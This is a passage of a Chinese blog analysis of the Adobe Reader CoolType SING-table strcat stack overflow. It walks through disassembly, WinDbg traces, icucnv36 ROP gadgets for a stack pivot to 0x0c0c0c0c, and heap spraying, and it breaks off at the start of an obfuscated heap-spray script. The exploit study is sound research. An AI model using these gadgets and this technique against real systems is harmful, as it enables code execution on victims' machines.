class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">push    offset aSing    ; <span class="string">"SING"</span></span><br><span class="line">push    edi             ; <span class="keyword">int</span></span><br><span class="line">lea     ecx, [ebp+<span class="number">108</span>h+var_12C]</span><br><span class="line">call    sub_8021B06      </span><br><span class="line">mov     eax, [ebp+<span class="number">108</span>h+var_12C]           ;eax = SING addr   </span><br><span class="line">cmp     eax, esi</span><br><span class="line">mov     byte ptr [ebp+<span class="number">108</span>h+var_10C], <span class="number">2</span>    </span><br><span class="line">jz      <span class="keyword">short</span> loc_803DDC4       </span><br><span class="line">mov     ecx, [eax]                        ;version</span><br><span class="line"><span class="keyword">and</span>     ecx, <span class="number">0F</span>FFFh              </span><br><span class="line">jz      <span class="keyword">short</span> loc_803DD9F                 </span><br><span class="line">cmp     ecx, <span class="number">100</span>h           </span><br><span class="line">jnz     <span class="keyword">short</span> loc_803DDC0                 </span><br><span class="line">add     eax, <span class="number">10</span>h                          ;SING+<span class="number">0x10</span> = SING-&gt;uniqueName</span><br><span class="line">push    eax             ; <span class="keyword">char</span> *          ;uniqueName</span><br><span class="line">lea     eax, [ebp+<span class="number">108</span>h+var_108]           ;<span class="built_in">stack</span> addr</span><br><span class="line">push    eax             ; <span class="keyword">char</span> *          </span><br><span class="line">mov     [ebp+<span class="number">108</span>h+var_108], <span class="number">0</span></span><br><span class="line">call    <span class="built_in">strcat</span></span><br></pre></td></tr></table></figure></p><p>所以现在漏洞很清晰啦，通过 <code>strcat</code> 函数将 <code>uniqueName</code> 的字符串来连接到栈地址，但是没有检查长度，造成溢出。<br><img src="http://static.zybuluo.com/dane909/6bdnh01djukp056nlcfz6enx/eee.png" alt="eee.png-134.8kB"><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">strcat</span><span class="params">(<span class="keyword">char</span> *dest, <span class="keyword">const</span> <span class="keyword">char</span> *src)</span></span>;</span><br></pre></td></tr></table></figure></p><p>虽然只是个栈溢出，但是因为软件过于复杂，并且还存在 <code>GS</code> 保护(虽然后面的利用 <code>GS</code> 没卵用)，所以利用起来难度还是很大的，至少对我这个菜鸡是这样，下面我们来看下是如何利用的。</p><h2 id="利用技巧"><a href="#利用技巧" class="headerlink" title="利用技巧"></a>利用技巧</h2><p>在 <code>strcat</code> 函数执行前查看帧栈信息，与执行后进行比较<br><img src="http://static.zybuluo.com/dane909/zgwj57idm9fd1zj4jxaf3nw1/fff.png" alt="fff.png-179.6kB"><br>可以看到栈上的数据的改动造成了相关帧栈信息的变动，例如 <code>0x0c0c0c0c</code>,可以很自然的想到 <code>heapspray</code>。<br>实际上面代码还有个很无法理解的地方<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0803</span>DCF9                 push    ebp</span><br><span class="line">.text:<span class="number">0803</span>DCFA                 sub     esp, <span class="number">104</span>h</span><br><span class="line">.text:<span class="number">0803</span>DD00                 lea     ebp, [esp<span class="number">-4</span>]</span><br></pre></td></tr></table></figure></p><p>编译器这样改 <code>ebp</code> 是为了优化??? 不懂<br>后面的通过栈上的可控变量控制 <code>eip</code> 这一步感觉实在想不出来，感觉可能是通过污点分析对可控数据监控，当遇到能通过 <code>call</code> 调用时记录下来，然后利用的。在 <code>0x0808B308</code> 处的指令可以通过栈上存储的值调用相应地址的指令，通过 <code>windbg</code> 跟踪来看下。<br><img src="http://static.zybuluo.com/dane909/uiygcjhivcupw0d7euv9ft38/ggg.png" alt="ggg.png-14.4kB"><br>跟踪直到运行到 <code>0808B308</code> 处，整理运行过的指令。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0803</span>ddb6 <span class="number">8b</span>cb            mov     ecx,ebx</span><br><span class="line"><span class="number">0803</span>ddb8 e88634fcff      call    CoolType+<span class="number">0x1243</span> (<span class="number">08001243</span>)</span><br><span class="line"><span class="number">0803</span>ddbd <span class="number">8b</span>45dc          mov     eax,dword ptr [ebp<span class="number">-24</span>h] ss:<span class="number">0023</span>:<span class="number">0012e4</span>b4=<span class="number">046</span>cb078</span><br><span class="line"><span class="number">0803</span>ddc0 c645ef01        mov     byte ptr [ebp<span class="number">-11</span>h],<span class="number">1</span>       ss:<span class="number">0023</span>:<span class="number">0012e4</span>c7=<span class="number">00</span></span><br><span class="line"><span class="number">0803</span>ddc4 <span class="number">3b</span>c6            cmp     eax,esi</span><br><span class="line"><span class="number">0803</span>ddc6 c645fc01        mov     byte ptr [ebp<span class="number">-4</span>],<span class="number">1</span>         ss:<span class="number">0023</span>:<span class="number">0012e4</span>d4=<span class="number">02</span></span><br><span class="line"><span class="number">0803</span>ddca <span class="number">7407</span>            je      CoolType+<span class="number">0x3ddd3</span> (<span class="number">0803</span>ddd3)             [br=<span class="number">0</span>]</span><br><span class="line"><span class="number">0803</span>ddcc <span class="number">50</span>              push    eax</span><br><span class="line"><span class="number">0803</span>ddcd e8ed3a0000      call    CoolType+<span class="number">0x418bf</span> (<span class="number">080418b</span>f)</span><br><span class="line"><span class="number">0803</span>ddd2 <span class="number">59</span>              pop     ecx</span><br><span class="line"><span class="number">0803</span>ddd3 <span class="number">807</span>def00        cmp     byte ptr [ebp<span class="number">-11</span>h],<span class="number">0</span>       ss:<span class="number">0023</span>:<span class="number">0012e4</span>c7=<span class="number">01</span></span><br><span class="line"><span class="number">0803</span>ddd7 <span class="number">0f</span>85cc000000    jne     CoolType+<span class="number">0x3dea9</span> (<span class="number">0803</span>dea9)             [br=<span class="number">1</span>]</span><br><span class="line"><span class="number">0803</span>dea9 <span class="number">8</span>d45e4          lea     eax,[ebp<span class="number">-1</span>Ch]</span><br><span class="line"><span class="number">0803</span>deac <span class="number">50</span>              push    eax</span><br><span class="line"><span class="number">0803</span>dead <span class="number">53</span>              push    ebx</span><br><span class="line"><span class="number">0803</span>deae <span class="number">57</span>              push    edi</span><br><span class="line"><span class="number">0803</span>deaf e82a8dfdff      call    CoolType+<span class="number">0x16bde</span> (<span class="number">08016b</span>de)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">08016b</span>de <span class="number">55</span>              push    ebp</span><br><span class="line"><span class="number">08016b</span>df <span class="number">81</span>ec60060000    sub     esp,<span class="number">660</span>h</span><br><span class="line"><span class="number">08016b</span>e5 <span class="number">8</span>d6c24fc        lea     ebp,[esp<span class="number">-4</span>]</span><br><span class="line"><span class="number">08016b</span>e9 a1b80f2308      mov     eax,dword ptr [CoolType!CTCleanup+<span class="number">0xe26ee</span> (<span class="number">08230f</span>b8)] ds:<span class="number">0023</span>:<span class="number">08230f</span>b8=<span class="number">67f</span>be93a</span><br><span class="line"><span class="number">08016b</span>ee <span class="number">33</span>c5            xor     eax,ebp</span><br><span class="line"><span class="number">08016b</span>f0 <span class="number">898560060000</span>    mov     dword ptr [ebp+<span class="number">660</span>h],eax ss:<span class="number">0023</span>:<span class="number">0012e458</span>=<span class="number">0012e4</span>cc</span><br><span class="line"><span class="number">08016b</span>f6 <span class="number">6</span>a50            push    <span class="number">50</span>h</span><br><span class="line"><span class="number">08016b</span>f8 b8325d1708      mov     eax,offset CoolType!CTCleanup+<span class="number">0x27468</span> (<span class="number">08175</span>d32)</span><br><span class="line"><span class="number">08016b</span>fd e8cf150300      call    CoolType!CTInit+<span class="number">0x1b2e</span> (<span class="number">080481</span>d1)</span><br><span class="line"><span class="number">08016</span>c02 <span class="number">8b</span>8574060000    mov     eax,dword ptr [ebp+<span class="number">674</span>h] ss:<span class="number">0023</span>:<span class="number">0012e46</span>c=<span class="number">0012e4</span>bc</span><br><span class="line"><span class="number">08016</span>c08 <span class="number">8b</span>b570060000    mov     esi,dword ptr [ebp+<span class="number">670</span>h] ss:<span class="number">0023</span>:<span class="number">0012e468</span>=<span class="number">0012e608</span></span><br><span class="line"><span class="number">08016</span>c0e <span class="number">8b</span>bd6c060000    mov     edi,dword ptr [ebp+<span class="number">66</span>Ch] ss:<span class="number">0023</span>:<span class="number">0012e464</span>=<span class="number">0012e718</span></span><br><span class="line"><span class="number">08016</span>c14 <span class="number">8945</span>a8          mov     dword ptr [ebp<span class="number">-58</span>h],eax ss:<span class="number">0023</span>:<span class="number">0012</span>dda0=ffeb0000</span><br><span class="line"><span class="number">08016</span>c17 b850a62308      mov     eax,offset CoolType!CTCleanup+<span class="number">0xebd86</span> (<span class="number">0823</span>a650)</span><br><span class="line"><span class="number">08016</span>c1c <span class="number">50</span>              push    eax</span><br><span class="line"><span class="number">08016</span>c1d <span class="number">8975e4</span>          mov     dword ptr [ebp<span class="number">-1</span>Ch],esi ss:<span class="number">0023</span>:<span class="number">0012</span>dddc=<span class="number">1200b</span>8e7</span><br><span class="line"><span class="number">08016</span>c20 <span class="number">8945</span>a4          mov     dword ptr [ebp<span class="number">-5</span>Ch],eax ss:<span class="number">0023</span>:<span class="number">0012</span>dd9c=<span class="number">00000001</span></span><br><span class="line"><span class="number">08016</span>c23 ff1530f11808    call    dword ptr [CoolType!CTCleanup+<span class="number">0x40866</span> (<span class="number">0818f</span>130)] ds:<span class="number">0023</span>:<span class="number">0818f</span>130=&#123;ntdll!RtlEnterCriticalSection (<span class="number">7</span>c921000)&#125;</span><br><span class="line"><span class="number">08016</span>c29 <span class="number">33</span>db            xor     ebx,ebx</span><br><span class="line"><span class="number">08016</span>c2b <span class="number">57</span>              push    edi</span><br><span class="line"><span class="number">08016</span>c2c <span class="number">895</span>dfc          mov     dword ptr [ebp<span class="number">-4</span>],ebx ss:<span class="number">0023</span>:<span class="number">0012</span>ddf4=ffffffff</span><br><span class="line"><span class="number">08016</span>c2f <span class="number">895</span>dd0          mov     dword ptr [ebp<span class="number">-30</span>h],ebx ss:<span class="number">0023</span>:<span class="number">0012</span>ddc8=<span class="number">1200b</span>8e7</span><br><span class="line"><span class="number">08016</span>c32 <span class="number">895</span>dec          mov     dword ptr [ebp<span class="number">-14</span>h],ebx ss:<span class="number">0023</span>:<span class="number">0012</span>dde4=<span class="number">81234378</span></span><br><span class="line"><span class="number">08016</span>c35 e8e24e0000      call    CoolType+<span class="number">0x1bb1c</span> (<span class="number">0801b</span>b1c)</span><br><span class="line"><span class="number">08016</span>c3a <span class="number">3b</span>c3            cmp     eax,ebx</span><br><span class="line"><span class="number">08016</span>c3c <span class="number">59</span>              pop     ecx</span><br><span class="line"><span class="number">08016</span>c3d <span class="number">8945e8</span>          mov     dword ptr [ebp<span class="number">-18</span>h],eax ss:<span class="number">0023</span>:<span class="number">0012</span>dde0=<span class="number">8</span>d235d88</span><br><span class="line"><span class="number">08016</span>c40 <span class="number">0f</span>8488060000    je      CoolType+<span class="number">0x172ce</span> (<span class="number">080172</span>ce)             [br=<span class="number">0</span>]</span><br><span class="line"><span class="number">08016</span>c46 <span class="number">6</span>a01            push    <span class="number">1</span></span><br><span class="line"><span class="number">08016</span>c48 <span class="number">53</span>              push    ebx</span><br><span class="line"><span class="number">08016</span>c49 <span class="number">53</span>              push    ebx</span><br><span class="line"><span class="number">08016</span>c4a <span class="number">8</span>d45ec          lea     eax,[ebp<span class="number">-14</span>h]</span><br><span class="line"><span class="number">08016</span>c4d <span class="number">50</span>              push    eax</span><br><span class="line"><span class="number">08016</span>c4e <span class="number">8</span>d45d0          lea     eax,[ebp<span class="number">-30</span>h]</span><br><span class="line"><span class="number">08016</span>c51 <span class="number">50</span>              push    eax</span><br><span class="line"><span class="number">08016</span>c52 <span class="number">57</span>              push    edi</span><br><span class="line"><span class="number">08016</span>c53 ff75e8          push    dword ptr [ebp<span class="number">-18</span>h]  ss:<span class="number">0023</span>:<span class="number">0012</span>dde0=<span class="number">01</span>efc87c</span><br><span class="line"><span class="number">08016</span>c56 e8c64e0000      call    CoolType+<span class="number">0x1bb21</span> (<span class="number">0801b</span>b21)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">0801b</span>b21 <span class="number">55</span>              push    ebp</span><br><span class="line"><span class="number">0801b</span>b22 <span class="number">8b</span>ec            mov     ebp,esp</span><br><span class="line"><span class="number">0801b</span>b24 ff7520          push    dword ptr [ebp+<span class="number">20</span>h]  ss:<span class="number">0023</span>:<span class="number">0012</span>dd88=<span class="number">00000001</span></span><br><span class="line"><span class="number">0801b</span>b27 <span class="number">8b</span>4d08          mov     ecx,dword ptr [ebp+<span class="number">8</span>] ss:<span class="number">0023</span>:<span class="number">0012</span>dd70=<span class="number">01</span>efc87c</span><br><span class="line"><span class="number">0801b</span>b2a ff751c          push    dword ptr [ebp+<span class="number">1</span>Ch]  ss:<span class="number">0023</span>:<span class="number">0012</span>dd84=<span class="number">00000000</span></span><br><span class="line"><span class="number">0801b</span>b2d <span class="number">8b</span>01            mov     eax,dword ptr [ecx]  ds:<span class="number">0023</span>:<span class="number">01</span>efc87c=<span class="number">081</span>a601c</span><br><span class="line"><span class="number">0801b</span>b2f ff7518          push    dword ptr [ebp+<span class="number">18</span>h]  ss:<span class="number">0023</span>:<span class="number">0012</span>dd80=<span class="number">00000000</span></span><br><span class="line"><span class="number">0801b</span>b32 ff05a0a62308    inc     dword ptr [CoolType!CTCleanup+<span class="number">0xebdd6</span> (<span class="number">0823</span>a6a0)] ds:<span class="number">0023</span>:<span class="number">0823</span>a6a0=<span class="number">00000000</span></span><br><span class="line"><span class="number">0801b</span>b38 ff7514          push    dword ptr [ebp+<span class="number">14</span>h]  ss:<span class="number">0023</span>:<span class="number">0012</span>dd7c=<span class="number">0012</span>dde4</span><br><span class="line"><span class="number">0801b</span>b3b ff7510          push    dword ptr [ebp+<span class="number">10</span>h]  ss:<span class="number">0023</span>:<span class="number">0012</span>dd78=<span class="number">0012</span>ddc8</span><br><span class="line"><span class="number">0801b</span>b3e ff750c          push    dword ptr [ebp+<span class="number">0</span>Ch]  ss:<span class="number">0023</span>:<span class="number">0012</span>dd74=<span class="number">0012e718</span></span><br><span class="line"><span class="number">0801b</span>b41 ff10            call    dword ptr [eax]      ds:<span class="number">0023</span>:<span class="number">081</span>a601c=<span class="number">0808b</span>116</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">0808b</span>116 <span class="number">55</span>              push    ebp</span><br><span class="line"><span class="number">0808b</span>117 <span class="number">8b</span>ec            mov     ebp,esp</span><br><span class="line"><span class="number">0808b</span>119 <span class="number">51</span>              push    ecx</span><br><span class="line"><span class="number">0808b</span>11a <span class="number">53</span>              push    ebx</span><br><span class="line"><span class="number">0808b</span>11b <span class="number">56</span>              push    esi</span><br><span class="line"><span class="number">0808b</span>11c <span class="number">57</span>              push    edi</span><br><span class="line"><span class="number">0808b</span>11d <span class="number">8b</span>7d08          mov     edi,dword ptr [ebp+<span class="number">8</span>] ss:<span class="number">0023</span>:<span class="number">0012</span>dd50=<span class="number">0012e718</span></span><br><span class="line"><span class="number">0808b</span>120 <span class="number">57</span>              push    edi</span><br><span class="line"><span class="number">0808b</span>121 <span class="number">8b</span>f1            mov     esi,ecx</span><br><span class="line"><span class="number">0808b</span>123 e802ffffff      call    CoolType!CTInit+<span class="number">0x44987</span> (<span class="number">0808b</span>02a)</span><br><span class="line"><span class="number">0808b</span>128 <span class="number">33</span>db            xor     ebx,ebx</span><br><span class="line"><span class="number">0808b</span>12a <span class="number">84</span>c0            test    al,al</span><br><span class="line"><span class="number">0808b</span>12c <span class="number">0f</span>8499010000    je      CoolType!CTInit+<span class="number">0x44c28</span> (<span class="number">0808b</span>2cb)      [br=<span class="number">0</span>]</span><br><span class="line"><span class="number">0808b</span>132 <span class="number">385</span>d1c          cmp     byte ptr [ebp+<span class="number">1</span>Ch],bl      ss:<span class="number">0023</span>:<span class="number">0012</span>dd64=<span class="number">01</span></span><br><span class="line"><span class="number">0808b</span>135 <span class="number">0f</span>8590010000    jne     CoolType!CTInit+<span class="number">0x44c28</span> (<span class="number">0808b</span>2cb)      [br=<span class="number">1</span>]</span><br><span class="line"><span class="number">0808b</span>2cb <span class="number">8b</span>06            mov     eax,dword ptr [esi]  ds:<span class="number">0023</span>:<span class="number">01</span>efc87c=<span class="number">081</span>a601c</span><br><span class="line"><span class="number">0808b</span>2cd <span class="number">885</span>d1f          mov     byte ptr [ebp+<span class="number">1F</span>h],bl      ss:<span class="number">0023</span>:<span class="number">0012</span>dd67=<span class="number">00</span></span><br><span class="line"><span class="number">0808b</span>2d0 ff5070          call    dword ptr [eax+<span class="number">70</span>h]  ds:<span class="number">0023</span>:<span class="number">081</span>a608c=<span class="number">08089937</span></span><br><span class="line"><span class="number">0808b</span>2d3 <span class="number">57</span>              push    edi</span><br><span class="line"><span class="number">0808b</span>2d4 <span class="number">8</span>d4e14          lea     ecx,[esi+<span class="number">14</span>h]</span><br><span class="line"><span class="number">0808b</span>2d7 e86432f9ff      call    CoolType+<span class="number">0x1e540</span> (<span class="number">0801e540</span>)</span><br><span class="line"><span class="number">0808b</span>2dc c686e000000001  mov     byte ptr [esi+<span class="number">0E0</span>h],<span class="number">1</span>      ds:<span class="number">0023</span>:<span class="number">01</span>efc95c=<span class="number">00</span></span><br><span class="line"><span class="number">0808b</span>2e3 <span class="number">8b</span>473c          mov     eax,dword ptr [edi+<span class="number">3</span>Ch] ds:<span class="number">0023</span>:<span class="number">0012e754</span>=<span class="number">0012e6</span>d0</span><br><span class="line"><span class="number">0808b</span>2e6 <span class="number">3b</span>c3            cmp     eax,ebx</span><br><span class="line"><span class="number">0808b</span>2e8 <span class="number">8986f</span>4020000    mov     dword ptr [esi+<span class="number">2F</span>4h],eax ds:<span class="number">0023</span>:<span class="number">01</span>efcb70=<span class="number">0012e6</span>d0</span><br><span class="line"><span class="number">0808b</span>2ee <span class="number">899</span>ef8020000    mov     dword ptr [esi+<span class="number">2F</span>8h],ebx ds:<span class="number">0023</span>:<span class="number">01</span>efcb74=<span class="number">00000000</span></span><br><span class="line"><span class="number">0808b</span>2f4 <span class="number">895</span>dfc          mov     dword ptr [ebp<span class="number">-4</span>],ebx ss:<span class="number">0023</span>:<span class="number">0012</span>dd44=<span class="number">01</span>efc87c</span><br><span class="line"><span class="number">0808b</span>2f7 <span class="number">7507</span>            jne     CoolType!CTInit+<span class="number">0x44c5d</span> (<span class="number">0808b</span>300)      [br=<span class="number">1</span>]</span><br><span class="line"><span class="number">0808b</span>300 <span class="number">8</span>d4dfc          lea     ecx,[ebp<span class="number">-4</span>]</span><br><span class="line"><span class="number">0808b</span>303 <span class="number">51</span>              push    ecx</span><br><span class="line"><span class="number">0808b</span>304 <span class="number">53</span>              push    ebx</span><br><span class="line"><span class="number">0808b</span>305 <span class="number">6</span>a03            push    <span class="number">3</span></span><br><span class="line"><span class="number">0808b</span>307 <span class="number">50</span>              push    eax</span><br><span class="line"><span class="number">0808b</span>308 ff10            call    dword ptr [eax]      ds:<span class="number">0023</span>:<span class="number">0012e6</span>d0=<span class="number">4</span>a80cb38</span><br></pre></td></tr></table></figure></p><p>下面来看下 <code>call    dword ptr [eax]</code> 会执行什么指令。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; r eax </span><br><span class="line">eax=0012e6d0</span><br><span class="line">0:000&gt; dd 0012e6d0 L1</span><br><span class="line">0012e6d0  4a80cb38</span><br><span class="line">0:000&gt; !address 4a80cb38</span><br><span class="line">*************************************************************************</span><br><span class="line">Usage:                  Image</span><br><span class="line">Allocation Base:        4a800000</span><br><span class="line">Base Address:           4a801000</span><br><span class="line">End Address:            4a849000</span><br><span class="line">Region Size:            00048000</span><br><span class="line">Type:                   01000000MEM_IMAGE</span><br><span class="line">State:                  00001000MEM_COMMIT</span><br><span class="line">Protect:                00000020PAGE_EXECUTE_READ</span><br><span class="line">More info:              lmv m icucnv36</span><br><span class="line">More info:              !lmi icucnv36</span><br><span class="line">More info:              ln 0x4a80cb38</span><br><span class="line">0:000&gt; u 4a80cb38</span><br><span class="line">icucnv36!ucnv_toUChars_3_6+0x162:</span><br><span class="line">4a80cb38 81c594070000    add     ebp,794h</span><br><span class="line">4a80cb3e c9              leave</span><br><span class="line">4a80cb3f c3              ret</span><br></pre></td></tr></table></figure></p><p>所以 <code>icucnv36!ucnv_toUChars_3_6+0x162</code> 处的 <code>gadget</code> 的作用就很明显了， <code>stack pivot</code>。单步执行看下下一个 <code>gadget</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; r ebp</span><br><span class="line">ebp=0012dd48</span><br><span class="line">0:000&gt; dd ebp</span><br><span class="line">0012dd48  0012dd68 0801bb43 0012e718 0012ddc8</span><br><span class="line">0012dd58  0012dde4 00000000 00000000 00000001</span><br><span class="line">0012dd68  0012ddf8 08016c5b 01efc87c 0012e718</span><br><span class="line">0012dd78  0012ddc8 0012dde4 00000000 00000000</span><br><span class="line">0012dd88  00000001 67e934c2 0012e718 00000000</span><br><span class="line">0012dd98  0012e608 0823a650 0012e4bc ff270000</span><br><span class="line">0012dda8  00000003 1200ccdd 81234378 1200b8e7</span><br><span class="line">0012ddb8  120058e8 1200b8e7 8d235d88 120034de</span><br><span class="line">0:000&gt; p</span><br><span class="line">eax=0012e6d0 ebx=00000000 ecx=0012dd44 edx=00000000 esi=01efc87c edi=0012e718</span><br><span class="line">eip=4a80cb3e esp=0012dd24 ebp=0012e4dc iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200202</span><br><span class="line">icucnv36!ucnv_toUChars_3_6+0x168:</span><br><span class="line">4a80cb3e c9              leave</span><br><span class="line">0:000&gt; dd ebp</span><br><span class="line">0012e4dc  f012512c 4a82a714 0c0c0c0c 47dabcf2</span><br><span class="line">0012e4ec  5c064f94 5c53850a 57ef3bba e910375e</span><br><span class="line">0012e4fc  ef4039c2 f0e3b6aa 61a8c5b4 c2474a7a</span><br><span class="line">0012e50c  15da11a6 436a7060 1d9d4505 1c1f88da</span><br><span class="line">0012e51c  249ca0df e4d40d46 269a3dfc daed6b97</span><br><span class="line">0012e52c  c920c5fc 2d4265c3 cb1f5a53 5a0c27e0</span><br><span class="line">0012e53c  69fd2e39 6d70eb0d b877a4e9 db9a8a4d</span><br><span class="line">0012e54c  883c0409 f6fa0ea5 6634d433 e7f0ef0d</span><br><span class="line">0:000&gt; p</span><br><span class="line">eax=0012e6d0 ebx=00000000 ecx=0012dd44 edx=00000000 esi=01efc87c edi=0012e718</span><br><span class="line">eip=4a80cb3f esp=0012e4e0 ebp=f012512c iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200202</span><br><span class="line">icucnv36!ucnv_toUChars_3_6+0x169:</span><br><span class="line">4a80cb3f c3              ret</span><br><span class="line">0:000&gt; p</span><br><span class="line">eax=0012e6d0 ebx=00000000 ecx=0012dd44 edx=00000000 esi=01efc87c edi=0012e718</span><br><span class="line">eip=4a82a714 esp=0012e4e4 ebp=f012512c iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200202</span><br><span class="line">icucnv36!icu_3_6::CharacterIterator::setToStart+0x8:</span><br><span class="line">4a82a714 5c              pop     esp</span><br><span class="line">0:000&gt; dd esp L1</span><br><span class="line">0012e4e4  0c0c0c0c</span><br><span class="line">0:000&gt; u 4a82a714 </span><br><span class="line">icucnv36!icu_3_6::CharacterIterator::setToStart+0x8:</span><br><span class="line">4a82a714 5c              pop     esp</span><br><span class="line">4a82a715 c3              ret</span><br></pre></td></tr></table></figure></p><p>通过两个 <code>gadget</code> 控制 <code>eip</code> 到了 <code>[0x0c0c0c0c]</code>,剩下就是堆喷射啦。<br>如果用图来表示这个过程的话，大概是下面这样吧。<br><img src="http://static.zybuluo.com/dane909/39u8io5zaa7z37msn91zijiz/ffss.png" alt="ffss.png-27.1kB"><br><code>emmmmmm</code> 现在已经控制 <code>eip = [0x0c0c0c0c]</code> 啦，剩下的就好多了， 堆喷射完成 <code>shellcode</code> 的布局，然后就是使 <code>eip</code> 滑入放置好的 <code>shllcode</code> 啦，堆喷射的代码可以通过 <code>PdfStreamDumper</code> 得到。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> mqraPQZSAwAwCczJcaACUcIIwCnLbss = <span class="built_in">unescape</span>;</span><br><span class="line"><span class="keyword">var</span> twSOePGGglyJWdlzCpRIHpSsaEoDFZmatVqAcDoCSkrLKdpcOIBqGOVtWQMSEAGMpVRA = mqraPQZSAwAwCczJcaACUcIIwCnLbss( <span 